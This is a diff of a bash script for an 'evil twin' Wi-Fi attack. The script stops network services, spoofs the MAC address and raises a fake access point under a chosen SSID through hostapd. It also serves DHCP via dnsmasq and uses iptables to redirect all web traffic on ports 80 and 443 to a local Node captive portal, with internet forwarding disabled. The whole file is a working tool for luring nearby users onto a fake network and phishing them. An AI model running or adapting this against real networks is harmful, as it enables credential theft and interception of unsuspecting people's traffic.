@@ -5,20 +5,45 @@ if [ "$(id -u)" != "0" ]; then
 	exit 1
 fi
 
-ARGC=$#
 
-if [ $ARGC -lt 2 ]
-then
-    echo "A (very) simple evil twin access point captive portal suite"
-    echo "command: $0 <evil_interface> <internet_interafce> <ssid>"
-    echo -e "\tdepends upon macchanger, hostapd, dnsmasq, iptables, go"
-    exit 1
+for ARGUMENT in "$@"
+do
+   KEY=$(echo $ARGUMENT | cut -f1 -d=)
+
+   KEY_LENGTH=${#KEY}
+   VALUE="${ARGUMENT:$KEY_LENGTH+1}"
+
+   export "$KEY"="$VALUE"
+done
+
+
+
+if [[ -z $iface || -z $ssid || -z $channel ]]; then
+  echo "help : "
+    echo "portal.sh <iface> <ssid> <bssid> <channel>"
+    echo "iface: interface name"
+    echo "ssid: name of our fake AP"
+    echo "channel: channel of our fake AP"
+    echo -e "\tdepends upon macchanger, hostapd, dnsmasq, iptables, npm, nodejs, airecrack-ng"
+  exit 1
 fi
 
-EVIL_IFACE=$1
-GOOD_IFACE=$2
 
-macchanger -r $EVIL_IFACE
+
+
+#reset
+./clean.sh
+#kill any process using port 80
+echo kill $(sudo netstat -anp | awk '/ LISTEN / {if($4 ~ ":80$") { gsub("/.*","",$7); print $7; exit } }')
+
+#kill interference
+systemctl stop NetworkManager
+airmon-ng check kill
+
+ip link set $iface down
+macchanger -r $iface
+ip link set $iface up
+
 
 # Enable IP forwarding
 sysctl net.ipv4.ip_forward=1
@@ -41,30 +66,32 @@ iptables -t nat -A PREROUTING -j GOBWEB
 iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 80 --to-destination 192.168.1.1:80
 iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 443 --to-destination 192.168.1.1:443
 
-iptables -t filter -A FORWARD -i $EVIL_IFACE -o $GOOD_IFACE -j ACCEPT
-iptables -t nat -A POSTROUTING -o $GOOD_IFACE -j MASQUERADE
+#iptables -t filter -A FORWARD -i $EVIL_IFACE -o $GOOD_IFACE -j ACCEPT
+#iptables -t nat -A POSTROUTING -o $GOOD_IFACE -j MASQUERADE
 
 
 # Assign static ip address
-ip addr flush dev $EVIL_IFACE
-ip addr add 192.168.1.1/24 dev $EVIL_IFACE
+ip addr flush dev $iface
+ip addr add 192.168.1.1/24 dev $iface
 
 # Start DHCP server
-dnsmasq -i $EVIL_IFACE --dhcp-range=192.168.1.10,192.168.1.200,12h
+xterm  -geometry 90x20+800+900  -fg green -xrm 'XTerm.vt100.allowTitleOps: false' -T Dnsmasq  -hold -e "dnsmasq -i $iface --dhcp-range=192.168.1.10,192.168.1.200,12h" &
 
-sed -i "s/interface=.*$/interface=$EVIL_IFACE/" hostapd.conf
 
-if [[ -n "$3" ]]
-then
-    sed -i "s/ssid.*$/ssid=$3/" hostapd.conf
-fi
+sed -i "s/interface=.*$/interface=$iface/" hostapd.conf
+sed -i "s/ssid.*$/ssid=$ssid/" hostapd.conf
+sed -i "s/channel.*$/channel=$channel/" hostapd.conf
+
 
 # Create AP, WPA2 mode
-hostapd hostapd.conf &
+xterm  -geometry 90x20+0+0  -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Hostapd AP'  -hold -e 'hostapd hostapd.conf' &
 
-# Oh apache and friends, how much I hate thou
-go run gobweb.go
-#& go run gobwebtls.go
-killall dnsmasq
+# Create AP, WPA2 mode
 
-sysctl net.ipv4.ip_forward=0
+xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Node Server'  -hold -e 'cd node-EVIL-TWIN ; npm run start' &
+
+
+read -p "Press any kill to close all..."
+#clean on finish
+killall xterm
+./clean.sh
